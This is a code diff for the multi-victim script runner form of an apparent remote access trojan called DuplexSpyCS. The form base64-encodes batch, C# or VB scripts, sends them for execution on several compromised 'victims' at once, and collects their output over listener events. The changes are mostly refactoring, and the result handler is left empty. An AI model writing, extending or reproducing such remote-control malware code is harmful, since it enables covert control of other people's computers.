@@ -13,23 +13,41 @@ namespace DuplexSpyCS
 {
     public partial class frmMultiRunScript : Form
     {
-        private TextEditorControl editor;
+        private TextEditorControl editor = new TextEditorControl();
 
-        public List<clsVictim> lsVictim;
+        private List<clsVictim> m_lsVictim { get; init; }
         private readonly string[] lvColumns =
         {
             "ID",
             "Result",
         };
 
-        public frmMultiRunScript()
+        public frmMultiRunScript(List<clsVictim> lsVictim)
         {
             InitializeComponent();
+
+            m_lsVictim = lsVictim;
+
+            Text = $"MultiRunScript[{lsVictim.Count}]";
+            StartPosition = FormStartPosition.CenterScreen;
+        }
+
+        void fnRecv(clsListener listener, clsVictim victim, List<string> lsMsg)
+        {
+            if (lsMsg[0] == "exec")
+            {
+                if (new string[] { "bat", "cs", "vb" }.Contains(lsMsg[1]))
+                {
+                    int code = int.Parse(lsMsg[2]);
+                    string output = clsCrypto.b64D2Str(lsMsg[3]);
+
+
+                }
+            }
         }
 
         void ReqExecuteScript()
         {
-            string type = null;
             string script = editor.Text;
             string b64Script = clsCrypto.b64E2Str(script);
 
@@ -58,17 +76,27 @@ namespace DuplexSpyCS
                 listView1.Columns.Add(header);
             }
 
-            foreach (clsVictim victim in lsVictim)
+            foreach (clsVictim victim in m_lsVictim)
             {
                 ListViewItem item = new ListViewItem(victim.ID);
                 item.Tag = victim;
                 listView1.Items.Add(item);
+
+                victim.m_listener.ReceivedDecoded += fnRecv;
             }
 
             listView1.Refresh();
 
+            //TextEditor
+            if (editor == null)
+                editor = new TextEditorControl();
+
+            tabControl1.TabPages[1].Controls.Add(editor);
+            editor.Dock = DockStyle.Fill;
+            editor.BringToFront();
+
             //Status label
-            toolStripStatusLabel1.Text = $"Victim[{lsVictim.Count}]";
+            toolStripStatusLabel1.Text = $"Victim[{m_lsVictim.Count}]";
         }
 
         private void frmMultiRunScript_Load(object sender, EventArgs e)
@@ -93,6 +121,12 @@ namespace DuplexSpyCS
         {
             foreach (ListViewItem item in listView1.Items)
                 item.Checked = false;
+        }
+
+        private void frmMultiRunScript_FormClosed(object sender, FormClosedEventArgs e)
+        {
+            foreach (var victim in m_lsVictim)
+                victim.m_listener.ReceivedDecoded -= fnRecv;
         }
     }
 }
